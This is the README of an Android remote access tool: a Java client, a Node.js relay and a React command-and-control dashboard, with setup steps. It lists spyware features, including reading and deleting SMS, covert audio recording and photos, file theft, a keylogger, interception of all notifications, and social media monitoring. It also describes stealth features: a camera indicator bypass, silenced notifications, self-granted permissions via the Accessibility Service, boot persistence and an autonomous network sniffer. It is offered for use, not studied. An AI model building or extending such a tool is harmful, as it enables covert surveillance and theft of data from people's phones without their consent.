# Remote Access Control Panel

## Architecture

A three-component remote device management system:

- **`app/`** — Android client (Java). Maintains a persistent TCP connection to the backend, executes remote commands, and streams live screen data.
- **`backend/`** — Node.js/Express server (port 5000). Relays messages between Android devices (TCP on port 6000) and the dashboard (WebSocket on `/ws`). Uses MongoDB for optional persistence.
- **`react-dashboard/`** — React + Vite admin panel (port 3000). Full command-and-control UI for connected Android devices.
- **`frontend/`** — Legacy static HTML dashboard (not actively maintained).
- **`frp/`** — Fast Reverse Proxy configs for NAT traversal.

## Workflows

- **Backend Server** — `cd backend && npm install && node server.js`
- **React Dashboard** — `cd react-dashboard && npm install && npm run dev` (Vite on port 3000)

## React Dashboard Components

| File | Role |
|------|------|
| `App.jsx` | Root state, WebSocket events, device/command state |
| `Sidebar.jsx` | Device list with online/offline status |
| `StatusBar.jsx` | Server connection indicator |
| `Overview.jsx` | Dashboard home with stats and activity log |
| `DeviceControl.jsx` | Per-device control (3 tabs: Commands, Screen Control, Screen Reader) |
| `CommandPanel.jsx` | All remote commands organized into categories |
| `ResultPanel.jsx` | Shows command results with image/audio rendering |
| `ScreenControl.jsx` | Live stream viewer + recording management |
| `ScreenReaderView.jsx` | Accessibility UI tree viewer |
| `ParamModal.jsx` | Parameter input modal for commands requiring args |
| `utils/reportGenerator.js` | Generates HTML reports from command results |

## Command Categories (CommandPanel)

- **System**: ping, device info, battery, network, wifi, installed apps
- **Location**: GPS location
- **Device**: vibrate, sound, clipboard get/set
- **SMS**: read, search, send, delete
- **Contacts**: list, search
- **Calls**: all logs, stats, by type, by number
- **Camera**: list cameras, take photo, screenshot
- **Audio**: record, stop, status, list recordings, get audio (base64), delete recording
- **Files**: list, read, write, copy, move, create directory, search, info, delete
- **Keylog**: get/clear keylogs
- **Notifications**: all, by app, clear
- **Screen Ctrl**: gestures, navigation, text input (requires accessibility service)
- **Screen Read**: UI tree dump, element search
- **Social Media**: quick access to WhatsApp/Instagram/Twitter/Facebook/Telegram/Snapchat/TikTok notifications

## Android App Capabilities

The Android client supports all commands listed above plus:
- Live screen streaming (MJPEG frames over WebSocket)
- Auto-grant permissions via Accessibility Service
- Keylogger via Accessibility Service
- Notification interception for all apps
- Boot persistence via BootReceiver
- Stealth features (CameraIndicatorBypass, SilentNotificationManager)
- Network sniffer (NetworkSniffer.java — autonomous, no command interface)
- Social media notification monitoring (SocialMediaMonitor.java)
